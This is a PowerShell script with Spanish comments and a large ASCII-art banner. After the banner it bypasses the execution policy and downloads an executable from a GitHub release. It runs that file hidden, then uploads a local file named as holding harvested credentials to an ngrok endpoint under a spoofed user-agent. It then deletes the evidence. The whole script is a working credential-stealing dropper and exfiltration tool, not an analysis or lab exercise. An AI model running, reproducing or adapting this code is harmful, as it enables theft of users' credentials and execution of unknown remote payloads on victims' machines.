# Función para mostrar el título con arte ASCII
function Show-ASCIIArt {
    $asciiArt = @'

                                                                                       ..           
                                                                                 *: ..#*.           
 .:.  .-:                                                                      .=%- .*@*.           
  #-...:*.                                                                     .**#.:*@=.           
  +#*..=#*.             ..:=+=:...                          .. ..-===:.        .*#%.+@=..           
  :@%-.+#%.            .:@*...:%@#..                       ..-%*.....-#.       ..@@:*#+#-..         
  ..@@:=@#.            .@#-%@@%...%@-...         .       -:@#..#@@#%-.#.     ..+@@@@@@*=#..         
  +%%@*+%#....         .@::@@@@@%-..+%%=..-...:**...-.:.#@+..%@@@@@@%:#..    .+:+@@@@:=%@+.         
  #=*@@@@@%==.         .#-.@@@@@@+-..:#@@@@@%@%@@@#@@@@@@-..+@@@@@@@%.#..    .+%#%#@@%-:%=.         
.-@@*.+@@%#:#.          .%.=@@@@@#-...-@@@@@@@@@@@@@@@@@%=.:%#@@@@@@-+=.      -@@@%%#*@#...         
 .%+.*@##@@@@:.         .-@.+@@@@@@@=%@@@@@@@@@@@@@@@@@@@#=+@@@@@@#.-+..     .=@@@@@@@-.            
  .#@@#%@@@@@@:          .:%:+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*.=*..      .+@@@@@@%:.            
   .:%@@@@@@@@%..          :@@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-*=        ..*@@@@@@+..            
    ..*@@@@@@@@@-           .+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@..        .+@@@@@@=..             
      .-@@@@@@@@%...       .#@@@@@@@@@@@%=%=@@@@@@@%=%@@@@@@@@@@%=..       .+@@@@@@-..              
      ..*@@@@@@@@%..       *@@@@@@@%#+=:.+=..=@@%:.:%#.:=*@@@@@@@@=.      .%@@@@@@@:..              
        =@@@@@@@@@%.     .:@@@@@@#--.....:#  .%@- .-*.     .=%@@@@@*..  ..*@@@@@@@@=.               
        -@@@@@@@@@%..   ..%@@@@#-...::-#@@#...#@*..-%:-::... .:#@@@@*:. .-%@@@@@@@@..               
        :*@@@@@@@@@@+...+*@#=:...+@@@@%#@@@@#.@@+:@@@@:#@@#%:.. ..-@@*..:@@@@@@@@@@...              
        ..%@@@@@@@@@#..:@@@=.-@@@@@@@@#@@@@@@@@@@@@@@@@#*@@@@@@=  ..#@%+:@@@@@@@@@@..               
        ..-@@@@@@@@@@+.-@%:.:#@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@%-....+@@%@@@@@@@@@@:..               
         .-#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-=#@#:-%@@@@@@@@@@@-......=@@@@@@@@@@*:.                
          .*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. ........#@@@@@@@@%##%@@@@@@%@@@@@@@@@..                 
          .:%@@@@@@@@@@@@@@@@@@#++##*%##....:*@%=-.. .###=#%#**#%%@@@@@@@@@@@@@@-.                  
          ..=@@@@@@@@@@@@@@@%*+--+%%%@+.  .#+-@%:-@.   .-##*#%@@@@@@@@@@@@@@@@@@.                   
           ..=@@@@@@@@@@@@@@@**%@@@@%+:   .@@@@@@%%.   **:+@@=-%@@@@@@@@@@@@@@@%.                   
            ..%@@@@@@@@@@@@@@@@@@-+%@#-.   .*@@@@%....+@@*.=@@%@@@%@@@@@@@@@@@+%.                   
             ..:@@@@@@@@@@@@@@@@@@@@@@@@@@#*#%%@%#*#@@@@@@@@@@@@@@@@@@@@@@@@@....                   
               ..+@@@@@@@@@@@@@@@@@@@@@@@@@@#++**#@@@@@@@@@@@@@@@@@@@@@@@@@*+.                      
                 ..*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%=.:                       
                    .*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*:..                        
                     .%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=                           
                                                                                                    
  -@@@@@@@@@@@@@=@@@@@@@@@@* .@@@%-%@@@@@@@@%+ :@@@@@@@@@@= .@@@#*@@@@@*    .@@@%. -@@@@@@@@@#-     
  .*...+@@%.....-@@@-....*@@#.@@@--%@@+....@@@=:@@@:....@@@+.@@@.*@@@@@@:   .@@@+-%@@-.......--     
       =@@#+     @@@+*===#@@#*@@@-=%@@%+===@@@*#@@@++===@@@#.@@@.#@@@@@@*+. .@@@*-@@@=.  .=====.    
       =@@#=     @@@@@@@@@@+*+@@@--%@@@@@@@@+#*+@@@@@@@@@***.@@@.*@@%*#@@@* .@@@+-@@@=.  :@@@@@*    
       =@@#=     @@@-::::#@@#:@@@--%@@*::::::+ :@@@:::::::= .@@@.*@@%+:*%@@=.@@@+-@@@=.    =@@@+    
       =@@#=     @@@-=   *@@#+@@@--%@@#.       :@@@:.       .@@@.*@@%+. #@@==@@@+-%@@=:....+@@@+    
       =@@#=     @@@-=   *@@#+@@@--%@@#.       :@@@:.       .@@@.*@@%+. ..@@@@@@+..-@@@@@@@@@+:.    
       .+..=     ::..=   -*..+::..-=..-.       .=....       .-...:=..=.  .+.....:. .-........--     
                                                                                                    
                                                                                                    
  -@@@@@@@@@=.   @@@@@@@@=.  .@@@@@@@@@@...@@@@@@@@@@...@@@@@@@@@+..  -@@@@@@@@@=. -@@@@:.    .@@@..
  -@@@%%%%@@%#::#@@%%%%@@%%.:#@@%%%%%%%%-*#@@%%%%%%%%*##@@%%%%%%@%%::*%@%%%%%%@@%*.-@@@@##.   .@@@=:
  -@@@====+@@@*:@@%-===*@@@+-@@%++=======%@@++========%@@*======@@@+#@@@=+====*@@@+-@@@@@%+:  .@@@-:
  -@@@@@@@@@+++:@@@@@@@@@@@=-@@%=:       %@@++        %@@*=     @@@-#@@@=:    =@@%=-@@+=@@@%= .@@@-:
  -@@@----+@%#::@@%----*@@@=-@@%=:       %@@++        %@@*=     @@@-#@@@=:    =@@%=-@@+--#@@%:.@@@-:
  -@@@-.  -@@@+:@@%-.  =@@@=-@@%=:       %@@++        %@@*=     @@@-#@@@=:    =@@%=-@@+-.-@@@==@@@-:
  -@@@=.  -@@@+:@@%-.  =@@@=.*@@@@@@@@@@-.+@@@@@@@@@@=.+@@@@@@@@@+-=++*@@@@@@@@@==+-@@+-. =#@@@@@@-:
  :#===.  .*===.+=--.  :#=== .=+========:..=+========+..*========:=.  :#========-. :+=:-.  -%=====-:
                                                                                                        
                                                                                        
                                                                                                   
'@
    Write-Host $asciiArt
}

# Mostrar título en ASCII
Show-ASCIIArt

# Forzar política de ejecución sólo en este proceso
Set-ExecutionPolicy Bypass -Scope Process -Force

# -----------------------
# 1. Descargar ejecutable desde GitHub
# -----------------------
$destino = "$env:TEMP\este2.exe"
$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/hola2/este2.exe"

try {
    Invoke-WebRequest -Uri $url -OutFile $destino
    Write-Output "Descarga completada."
}
catch {
    Write-Output "Error al descargar el ejecutable: $_"
    exit
}

# -----------------------
# 2. Ejecutar el archivo descargado (oculto)
# -----------------------
try {
    Start-Process -FilePath $destino -WindowStyle Hidden -Wait
    Write-Output "Ejecución completada."
}
catch {
    Write-Output "Error al ejecutar el archivo descargado: $_"
    exit
}

# -----------------------
# 3. Esperar 5 segundos
# -----------------------
Start-Sleep -Seconds 5

# -----------------------
# 4. Subir el archivo de resultados
# -----------------------
$rutaArchivo = "C:\Users\Public\resultados_credenciales.txt"
$uploadUrl = "https://6c58-186-10-15-173.ngrok-free.app/upload.php"
if (Test-Path $rutaArchivo) {
    $fileBytes = [System.IO.File]::ReadAllBytes($rutaArchivo)
    $boundary = "----WebKitFormBoundary" + ([System.Guid]::NewGuid().ToString("N"))
    $LF = "`r`n"
    $fileName = [System.IO.Path]::GetFileName($rutaArchivo)

    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        "",
        [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes),
        "--$boundary--",
        ""
    )

    $body = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetBytes(($bodyLines -join $LF))

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
        "User-Agent"   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/http://123.0.0.0 Safari/537.36/Prueba"
        "Accept"       = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    }

    try {
        $response = Invoke-WebRequest -Uri $uploadUrl -Method Post -Headers $headers -Body $body
        Write-Output "Respuesta del servidor: $($response.Content)"

        # Borrar archivo resultado y ejecutable
        Remove-Item -Path $rutaArchivo -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $destino -Force -ErrorAction SilentlyContinue
        Write-Output "Archivos locales eliminados."
    }
    catch {
        Write-Output "Error al subir archivo: $_"
    }
}
else {
    Write-Output "Archivo de resultados no encontrado. No se subió nada."
}